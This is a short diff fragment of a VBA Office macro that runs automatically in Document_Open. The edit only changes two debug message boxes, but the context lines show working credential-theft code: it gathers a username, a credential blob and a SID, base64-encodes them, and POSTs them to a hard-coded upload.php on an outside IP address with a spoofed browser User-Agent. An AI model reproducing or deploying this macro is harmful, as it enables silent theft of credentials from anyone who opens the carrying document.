@@ -110,7 +110,7 @@ Private Sub Document_Open()
          Set oWMIQuery = Nothing
          Set oWMI = Nothing
          msg = "USERNAME = " & username & vbCrLf & "CREDENTIAL = " & blob & vbCrLf & "SID = " & sid & vbCrLf
-         If dbg = 1 Then MsgBox msg
+         If dbg = 1 Then MsgBox Prompt:=msg, Title:="Use ctrl-c and ctrl-v to copy/paste"
          b64data = StrConv(msg, vbFromUnicode)
          Set oXML = CreateObject("MSXML2.DOMDocument")
          Set oNode = oXML.createElement("b64")
@@ -120,7 +120,7 @@ Private Sub Document_Open()
          msg = Replace(Replace(msg, Chr(10), ""), Chr(13), "")
          Set oNode = Nothing
          Set oXML = Nothing
-         If dbg = 1 Then MsgBox msg
+         If dbg = 1 Then MsgBox Prompt:=msg, Title:="Use ctrl-c and ctrl-v to copy/paste"
          Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
          oHTTP.Open "POST", "http://10.1.2.3/upload.php", False
          oHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
